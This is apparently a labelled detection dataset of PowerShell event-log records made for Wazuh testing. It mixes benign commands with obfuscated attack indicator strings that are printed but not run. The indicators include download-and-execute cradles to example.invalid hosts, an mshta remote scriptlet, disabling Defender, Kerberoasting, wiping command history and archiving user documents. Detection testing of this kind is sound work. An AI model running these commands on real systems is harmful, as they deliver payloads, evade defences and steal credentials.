sample_id,declared_sample_id,mapping_status,source_line,channel,provider_name,computer,record_id,time_created_utc,event_id,scriptblock_id,message_number,message_total,dataset_fidelity_status,scriptblock_sha256,scriptblock_text
PST-046,PST-046,mapped,46,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721685,2026-07-17T09:35:49.1504654Z,4104,847d2673-18fd-4d17-b928-51fef79b27ec,1,1,exact,61d851420c0a43955d36f585f1aff0c6e3874c1b6e0c8dfe7a604fbf5b7727f6,"$sampleId='PST-046'; $encoded='RwBlAHQALQBDAGwAaQBwAGIAbwBhAHIAZAAgAC0AUgBhAHcAIAB8ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBKAHMAbwBuACAALQBDAG8AbQBwAHIAZQBzAHMA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-047,PST-047,mapped,47,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721687,2026-07-17T09:35:49.4899855Z,4104,6f5768a7-4423-4eae-846a-42c22bd1fa48,1,1,exact,59e8c410eb824f05ffd1887976de2315e99c532cc0155f05bdd3828f20ca0fb4,"$sampleId='PST-047'; $indicator='Get-ItemProperty -Path ''HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'''; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-048,PST-048,mapped,48,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721689,2026-07-17T09:35:49.8209368Z,4104,c7ae52c9-ed36-4a55-aed8-8ef06d7d0932,1,1,exact,fbdf091f8dbbe8e56432713e934481e0143a291061cabed17df3795b2ca0aa14,"$sampleId='PST-048'; $indicator='Clear-' + 'Histo' + 'ry; Re' + 'move-Item' + ' (Ge' + 't-PSRe' + 'adLineO' + 'ption).Hist' + 'orySave' + 'Path -Forc' + 'e'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-049,PST-049,mapped,49,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721693,2026-07-17T09:35:50.1584591Z,4104,fc1426a8-ed3a-41a7-84c6-9d5601c3eae3,1,1,exact,46bd7cc062fe7f39dfaaca8515be6cd4ebb4a5330031e42fd45a531e7af40eed,"$sampleId='PST-049'; $indicator='inVokE-ReSTMetHod -meTHOd PoST -urI ''hTTPS://aPI.eXAmplE.INvaLID/CHeckiN'' -bOdy @{hOsT=''ws-01'';uSEr=''analySt'';sTAtUS=''ok''}'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-050,PST-050,mapped,50,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721697,2026-07-17T09:35:50.4768245Z,4104,1c1dddff-baa1-4623-a06d-95a0d5ed8b0b,1,1,exact,43a795fe9c9602ed76ea15a1725dc00aa0c29f7007317ce195a93bb2dd10e24b,"$sampleId='PST-050'; @{host=$env:COMPUTERNAME; user=$env:USERNAME} | ConvertTo-Json; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-051,PST-051,mapped,51,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721701,2026-07-17T09:35:50.8259222Z,4104,878b0401-1dcb-49a3-b6d2-0a4d34a6aecd,1,1,exact,39fc2ff47b2ed2943220a984e519ae7ebf1d00ddcca654c8f368659e3cf1cee1,"$sampleId='PST-051'; $indicator='Clear-Hi`story; Remo`ve-Item (Get-PSReadLineOption).History`Sa`vePath -Force'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-052,PST-052,mapped,52,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721714,2026-07-17T09:35:51.1509156Z,4104,a60b670a-78fc-4390-824b-7a87548b66b3,1,1,exact,e154461b092d9eb767550a4dffce1ccb2790d36d8b07e07c4d4156d5d0eb0b84,"$sampleId='PST-052'; $parts=@('get-I','TemPr`','OpeR`tY -','PaTh ''H','KLm:\sof`T','WArE\Mi`CRos','OFt\WIND`','owS\Cu`RR','ENtvERsI`on','\uni`NsTa','lL\*'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-053,PST-053,mapped,53,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721716,2026-07-17T09:35:51.4778477Z,4104,fc35a5c4-1176-4bb5-b06d-cccfb076b217,1,1,exact,c3b54ebd55b90118de5bf4689da848c585fb5fc0899496d7ce5476a05b32c69a,"$sampleId='PST-053'; $parts=@('gEt-chi','ldITem ''','C:\userS',''' -rE','c`URSe -F','oRCE -ErrO','r`AcTIo','N sI','le`NtlycOn','TI`nuE'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-054,PST-054,mapped,54,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721719,2026-07-17T09:35:51.8145928Z,4104,7cb9137a-6820-4fe9-8722-e458ec741172,1,1,exact,1f4c4125cfea685842115318aec0d018cbd0b9662535b12a125c2abed0634925,"$sampleId='PST-054'; (Get-ChildItem -Path $env:TEMP -File -ErrorAction SilentlyContinue | Measure-Object).Count; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-055,PST-055,mapped,55,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721723,2026-07-17T09:35:52.1555907Z,4104,ed93d300-9644-42ed-a2b0-d017c48a1c16,1,1,exact,bc046397d19011b94353a1ac147486f4b9d3eed364b86c7048062e5fcce51f2a,"$sampleId='PST-055'; $indicator='[ReFLection.asSemBLy]::LOaD([CONVERT]::fRombaSE64STRiNG(''vehfu0LtLUlOrVJUluRVtU1z''))'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-056,PST-056,mapped,56,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721727,2026-07-17T09:35:52.4818773Z,4104,783e2604-1eb7-4297-892f-1d40a24c0c32,1,1,exact,3b57fb10a1ece01a8dbaa5f74c272e20c8ac4dc245890abfd63f1844799d7ae4,"$sampleId='PST-056'; Get-SmbShare -ErrorAction SilentlyContinue | Select-Object -First 5 Name, Path; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-057,PST-057,mapped,57,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721804,2026-07-17T09:35:53.8555855Z,4104,4c54e487-b765-462a-83f5-8e1148dc1936,1,1,exact,060ac911143e21e5361d7a6c4a49ddd95da2e6d19c56cec3c287d305321bd469,"$sampleId='PST-057'; $indicator='ReSOlvE-dnsnAme -TyPE Txt -nAmE ''task.eXAmplE.InvaLiD'' | sELeCT-obJECT -exPANDprOpeRtY StrInGS'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-058,PST-058,mapped,58,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721807,2026-07-17T09:35:54.1844201Z,4104,c843cf6e-b094-4bd0-83b7-719195dea2f6,1,1,exact,8ec0f2c325d1e1d03d58554666c6cd91011877ae7e12808e2b2dbcb3fa09ea8e,"$sampleId='PST-058'; $parts=@('Get-Pro','cess |',' Se','lect-Obj','ect Na','me,','Id,Pa','th'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-059,PST-059,mapped,59,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721821,2026-07-17T09:35:54.5120423Z,4104,ba784878-77b5-4aaa-b5a2-0e7e59afba78,1,1,exact,122135d4832fa3442f8652300879df5e097a6b344be8a19acedc02370964d36e,"$sampleId='PST-059'; Test-Path -Path $env:TEMP; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-060,PST-060,mapped,60,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721823,2026-07-17T09:35:54.8339514Z,4104,f93885df-4ae5-4510-b69e-4470251a1921,1,1,exact,4ff8039da9841f207076cdfc5e943296aca1bf62c50fab3b4c5baf947aac204e,"$sampleId='PST-060'; Get-ChildItem Env: | Select-Object -First 6 Name, Value; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-061,PST-061,mapped,61,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721825,2026-07-17T09:35:55.1771465Z,4104,b876b669-8365-446a-97e9-e82a28b3e3c6,1,1,exact,04d1665fefdce4b67d8220d09d0dcca9bca789f6bce1bfa1ba679195406d96e2,"$sampleId='PST-061'; $encoded='JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACAAJAB3AGMALgBQAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACAAJAB3AGMALgBIAGUAYQBkAGUAcgBzAFsAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcAXQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACcAOwAgACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AYwBkAG4ALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGEAJwApAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-062,PST-062,mapped,62,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721830,2026-07-17T09:35:55.5036201Z,4104,beab8933-e6c9-4468-8636-78fb2be39cc9,1,1,exact,cc72bacbf038d0d27a475ae2df984a44ecce6f70967d9038b9b57fa61b3886c9,"$sampleId='PST-062'; $parts=@('Get-Ch','ildItem ''','C:\User','s'' -R','ecurse -F','orce ','-ErrorAc','tion Sile','ntlyContinue'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-063,PST-063,mapped,63,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721834,2026-07-17T09:35:55.8258715Z,4104,69313e31-30a7-4654-8287-a75ffaa8b501,1,1,exact,e14e724b77be65f6c72698b488e5331b774b7289431e5a9588e48d4288ac24f8,"$sampleId='PST-063'; $indicator='[System.Dra`wing.Graphics]::Fro`mImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size)'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-064,PST-064,mapped,64,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721837,2026-07-17T09:35:56.1510661Z,4104,b4818898-e894-475f-861f-89fca4888719,1,1,exact,20730a612ea0c9e110cefdf2909ceee2f86763efbdbcf201e6e6ad43371531f7,"$sampleId='PST-064'; $parts=@('$wc=New-Obj','ect Net.Web','Client; $wc.','Proxy=[Net.','WebRequest]::Defa','ultWebProxy; ','$wc.Headers[''Use','r-Agent'']=''Mo','zilla/5.0''; $wc.','DownloadString(''','https://cdn.','example.invalid/','a'')'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-065,PST-065,mapped,65,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721840,2026-07-17T09:35:56.5038713Z,4104,86182632-8e8e-474a-adfe-e10b64a53d25,1,1,exact,7e8beddd29aa8f08a0fd3bbdbd3cc54fd1f0435e8fde0f07535afe2d1b53550e,"$sampleId='PST-065'; Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 3 -ErrorAction SilentlyContinue | Select-Object Id,TimeCreated; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-066,PST-066,mapped,66,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721854,2026-07-17T09:35:56.9059797Z,4104,8e06ab11-0d79-4a20-bac0-76c482b186e4,1,1,exact,1f88f12ff5f70c85a78c57725b15c080fe2333c588b9c3aa1e237239ac537181,"$sampleId='PST-066'; $parts=@('$wC=NEW-OBJEct',' NeT.weBCliENT; $','wC.proxy=[nET','.webREqUEST]','::dEFAult`w','`EBprOXy; $w','c.heAdErs[''uS','Er-AGent'']=''mo','zIl`LA/5.0''; $wC.d','owNlO`a`dStRING(''h','tTPs://cDN.ex','AMplE.INv`alID/a'')'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-067,PST-067,mapped,67,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721857,2026-07-17T09:35:57.2289760Z,4104,5be7130c-353e-410a-8dbd-759c68bc8b56,1,1,exact,5e373f88091b56412f01884d0b2c86db9dbd9904aea1a1deb0484196fc89aac9,"$sampleId='PST-067'; $p = ('C:' + '\ProgramData' + '\Reports' + '\inventory.json'); Write-Output $p; Write-Output 'hard benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-068,PST-068,mapped,68,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721860,2026-07-17T09:35:57.5544627Z,4104,6262c777-65d4-48e4-b9ff-d20e723e6c22,1,1,exact,99db323b9505e61f5be8c7920421452e51b4066f5deab95cc474d0a57288c645,"$sampleId='PST-068'; $cfg = 'path=C:\Temp;mode=audit;owner=admin;enabled=true;retry=3;hash=AA11-BB22-CC33'; Write-Output $cfg; Write-Output 'hard benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-069,PST-069,mapped,69,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721875,2026-07-17T09:35:57.8966081Z,4104,55afd688-8696-4197-b564-df0a22a9ac0d,1,1,exact,8c60602e3d06edf8d5194bc3e216725aff6b6dc9f521a2c1936e4c512623302a,"$sampleId='PST-069'; Get-ChildItem -Path $env:TEMP -ErrorAction SilentlyContinue | Select-Object -First 5 Name; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-070,PST-070,mapped,70,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721878,2026-07-17T09:35:58.2373185Z,4104,1cc30005-adda-41d4-869a-62446b44e33f,1,1,exact,ae0b91f2921014d0f2bfa2359c23ce804290938c89fd36d3ab87e0fbea1d0346,"$sampleId='PST-070'; Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | Select-Object ProductName, ReleaseId; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-071,PST-071,mapped,71,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721879,2026-07-17T09:35:58.5811492Z,4104,f11af174-45f7-416f-a7ae-bf7cb44e9d54,1,1,exact,289d03ce772e5929f3df012d298af513a47f51cc62d65cfbb5de4024c686baec,"$sampleId='PST-071'; $b = 'aW52ZW50b3J5LW5vdGU='; [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)); Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-072,PST-072,mapped,72,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721882,2026-07-17T09:35:58.9252085Z,4104,6f601b90-1f8a-4e9d-a366-8a5c3d9256f6,1,1,exact,2a612691f6965ee88b2a546a4a55955f83aaafe21edea2031b710e2b800438c2,"$sampleId='PST-072'; $indicator='Invoke-Ker' + 'beroast -' + 'OutputF' + 'ormat H' + 'ashcat ' + '| Select-' + 'Objec' + 't Sa' + 'mAccoun' + 'tName,Hash'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-073,PST-073,mapped,73,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721887,2026-07-17T09:35:59.2438449Z,4104,e4020163-a6aa-4a4c-b345-3a9990a94fe4,1,1,exact,bc4765f3c9e3989dc2d067577a03c400af2ba1d76bf0408f197d25920f0fda3e,"$sampleId='PST-073'; 'routine maintenance script' | Measure-Object -Character; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-074,PST-074,mapped,74,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721889,2026-07-17T09:35:59.5752765Z,4104,65f79a7f-312b-4095-b3e2-0749677fa807,1,1,exact,e8d6a85c50d111684eb3209e46f6589d62da12d63b413647c054a9f682552694,"$sampleId='PST-074'; $indicator='mshta.exe javascript:a=GetObject(''script:https://hta.example.invalid/a.sct'').Exec();close()'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-075,PST-075,mapped,75,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721893,2026-07-17T09:35:59.9195467Z,4104,e84c0872-01b5-4520-869a-360f47c4f0e3,1,1,exact,26c8b48f09ab18654c41310e8a567a854fafad877486a3c9f53b992f63775d8b,"$sampleId='PST-075'; $indicator='sEt-MpprEFerenCe -ExcLusiOnPatH ''c:\__ThesiS_iNERT__'' -diSAbLErEALTImeMOnITOrinG $trUE'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-076,PST-076,mapped,76,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721896,2026-07-17T09:36:00.2489579Z,4104,0c84a334-cddf-458e-ad53-3b9aaf72fe05,1,1,exact,927b7618d04056cdab916537a4961b5ecb41c49faa9ffc1c4749d359eb1dac78,"$sampleId='PST-076'; $indicator='Get-ChildItem ''$env:USERPROFILE\Documents'' -Recurse | Compress-Archive -DestinationPath ''$env:TEMP\collect.zip'''; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-077,PST-077,mapped,77,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721909,2026-07-17T09:36:00.5662500Z,4104,c40b0bef-6b95-49bc-8437-f8a61f8fdb5f,1,1,exact,38d9480ccc17b492d1c3c4a2fd5f9e22427db9e49abe8a1a2e949dd7bc1c4342,"$sampleId='PST-077'; Get-HotFix | Select-Object -First 5 HotFixID, InstalledOn; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-078,PST-078,mapped,78,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721932,2026-07-17T09:36:02.3404110Z,4104,bb650d0c-fb28-41dc-b5ac-a0c402dc61ba,1,1,exact,363b016fa9b258978323666b14f147977a2d57991e2243e627e4f5dc9e122309,"$sampleId='PST-078'; $parts=@('$X=NeW-ObjECT',' -cOMoB`j','eCt MSxML2.SER','VErxmLhTTP;',' $x.Open(''g','et'',''HTTpS://x','Ml.Ex`AmPLe.I','NVALId/T','Ask'',$falSE','); $X.SeN','d(); IEX $x','.RESPonSETe','XT'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-079,PST-079,mapped,79,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721934,2026-07-17T09:36:02.6653178Z,4104,14fbaae1-e757-49fa-9a37-0d65be6c8032,1,1,exact,87c20ba5de0185a46dbac856726cd9974dfbff347ae5fd8e23fc9d9b4263ef61,"$sampleId='PST-079'; Get-Service | Select-Object -First 8 Name, Status; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-080,PST-080,mapped,80,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721940,2026-07-17T09:36:03.0000017Z,4104,b59cc80d-e3f1-4d2d-ba7c-c1fe6affc7e2,1,1,exact,30f633510d9516918abbbd8616159953a138e3aeb85eb7511ab882cb2f5f9b4f,"$sampleId='PST-080'; $indicator='powe`rshell.exe -NoProfile -Wi`ndowStyle Hi`dden -EncodedCommand Vw`ByAGk`AdABlAC0ATwB1AH`QAcAB1AHQ`AIAAnAF`QASABFAFMASQBTAC0ASQBOAEUAUgB`UAC`cA'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-081,PST-081,mapped,81,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721942,2026-07-17T09:36:03.3166159Z,4104,7c97e40a-7568-4a63-a393-bad24d189416,1,1,exact,eb8c24880e55278086131d2e2a4d834ebe3db2ded2e1a5001cf705dfd5ca37a4,"$sampleId='PST-081'; $indicator='gET-chiLditEm ''$eNV:UseRpROfILe\documEnTS'' -REcURSE | ComPResS-arChIvE -DeSTInaTionpAtH ''$ENv:TemP\ColLecT.ziP'''; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-082,PST-082,mapped,82,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721944,2026-07-17T09:36:03.6422804Z,4104,e7b697dd-4d18-4861-867c-3379d0f63aa1,1,1,exact,9448083be6fdfd7c16a9b56c2361cc05b1436d3abd6578a4b42880224ea42742,"$sampleId='PST-082'; Get-Command Get-Process | Select-Object Name, CommandType, Source; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-083,PST-083,mapped,83,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721948,2026-07-17T09:36:03.9854401Z,4104,78ea57c0-5d7d-4ae1-8acf-1aa9984cf8fb,1,1,exact,bfc57128c8acecb614b3baf5414c17b95e00b06af022fd42ed4f30dbff56c060,"$sampleId='PST-083'; $parts=@('InVO`KE-Comm`A','nD -COMpu`T`ERnaMe',' ''hoST.exAmplE.INV','alid'' -sCri`PtB','lOck { pOWe`rSH','elL.ExE -NopRo`f','ilE -ENCODedCo','MMAnD vWbYAGKAD','ABLAC0AtWb1AHQ','AcAB1aHqAiaAnAFqasab','fAfMasqbtAc0A','SqBoAEuAuGBuaCCA',' }'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-084,PST-084,mapped,84,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721951,2026-07-17T09:36:04.3153681Z,4104,faf9d73d-1395-4e22-ab61-97b7852f4418,1,1,exact,85046801dbd52de4a87436d5c9104bd31b9a4d72cf186ca1209af7233113f93e,"$sampleId='PST-084'; Write-Host ('Host: ' + $env:COMPUTERNAME + '; User: ' + $env:USERNAME); Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-085,PST-085,mapped,85,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721964,2026-07-17T09:36:04.6517919Z,4104,f5b2b900-58ca-4181-aaf1-4cee8ab0a90b,1,1,exact,c060749ad0ca29e787d4203ddfbce73ac70d5a123ca0cdfe7de3868bfe117086,"$sampleId='PST-085'; Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -ErrorAction SilentlyContinue | Select-Object -First 3 PSChildName; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-086,PST-086,mapped,86,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721967,2026-07-17T09:36:04.9819675Z,4104,282b201f-4bd5-468a-9110-2d09f6210a20,1,1,exact,c4b50078660f5f96ca8ee5e0fc08914e422188759dd11e0b81a532e453add49e,"$sampleId='PST-086'; Write-Output $PROFILE; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-087,PST-087,mapped,87,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721971,2026-07-17T09:36:05.3100892Z,4104,c0af7646-1be4-4588-bd4a-d5e867083e72,1,1,exact,f07000e5d7289ac8c83977307c8e13e2a905d13d92ca7b24c87df7b351ff0dd2,"$sampleId='PST-087'; $indicator='poWersHELL.Exe -NoProfIlE -wiNDOwStylE HidDeN -eNCOdEDComMAnD vWBYaGKAdABLAc0aTWb1aHqACaB1AhqaiAAnafQasAbfAFMAsqbtAC0asQBoaEuAUGbUacca'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-088,PST-088,mapped,88,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721987,2026-07-17T09:36:05.6347514Z,4104,cfc6f670-8b95-401f-a349-480f65c350bf,1,1,exact,fa96ba0b2e6d11cde2c060cd803183963bd32de59cb451284eddfd51d3e1b1b4,"$sampleId='PST-088'; $parts=@('Invoke-Res','tMethod -Met','hod Post',' -Uri ''h','ttps://api.ex','ample.i','nvalid/','checkin'' -','Body @{h','ost=''WS-01'';use','r=''analyst'';','status=''ok''}'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-089,PST-089,mapped,89,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721989,2026-07-17T09:36:05.9719609Z,4104,aac006de-5f38-4aa2-a7aa-ce4834057510,1,1,exact,89386904b70490ef5ca45632c78de7ba525fc88b0f1834e8921eba00b8702f38,"$sampleId='PST-089'; Get-WinEvent -ListProvider Microsoft-Windows-PowerShell | Select-Object Name, LogLinks; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-090,PST-090,mapped,90,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721993,2026-07-17T09:36:06.3456233Z,4104,85dcb97b-0d7b-4d8f-a9b9-02c3609288c7,1,1,exact,c2cb08c44c07057a6e26a9f3c2832ded26a8296f842d334ad0594e0dc353f9ba,"$sampleId='PST-090'; Get-Process `
| Select-Object -First 3 Name, Id; Write-Output 'hard benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-091,PST-091,mapped,91,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722009,2026-07-17T09:36:06.6882877Z,4104,5e7d0f77-54b4-483e-9758-c324a54b8fc7,1,1,exact,9c0a959db73e55a80df281cb660dc1b4dab0dde99eeeac48d736035884e9818a,"$sampleId='PST-091'; Get-Culture | Select-Object Name, DisplayName; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-092,PST-092,mapped,92,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722016,2026-07-17T09:36:07.0327624Z,4104,15f109ec-c999-4f5c-98b0-012c6c83f87d,1,1,exact,a9954d5eb294d26393bc68edb9c9f4d119a703f915bec9e0ccc62872454ef192,"$sampleId='PST-092'; $url = 'http://localhost:8080/healthz?component=agent&format=text'; Write-Output $url; Write-Output 'hard benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-093,PST-093,mapped,93,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722020,2026-07-17T09:36:07.3520979Z,4104,daed9f8a-50d8-45d2-a516-3d8f1154222c,1,1,exact,feb9f01c958a8acaf93345ed2b3a5c031ecf00d8545749bf38b8f34925da378f,"$sampleId='PST-093'; Get-NetAdapter | Select-Object -First 5 Name, Status, MacAddress; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
